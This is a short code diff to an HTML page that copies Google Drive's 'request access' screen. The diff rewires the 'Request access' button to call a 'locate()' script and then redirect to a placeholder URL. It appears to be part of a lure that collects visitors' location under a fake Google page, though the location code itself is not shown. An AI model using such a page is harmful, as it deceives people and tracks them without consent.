@@ -13,7 +13,6 @@
     	}
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-    <script type="text/javascript" src="js/info.js"></script>
 	<script type="text/javascript" src="js/location.js"></script>
 </head>
 <body onload="information();">
@@ -33,7 +32,7 @@
 					<p>Want in? Ask for access, or switch to an account with permission.</p>
 				</div>
 				<p id="buttons" style="padding-top: 10px">
-					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate();">Request access</button>
+					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>
 				</p>
 			</div>
 		</div>
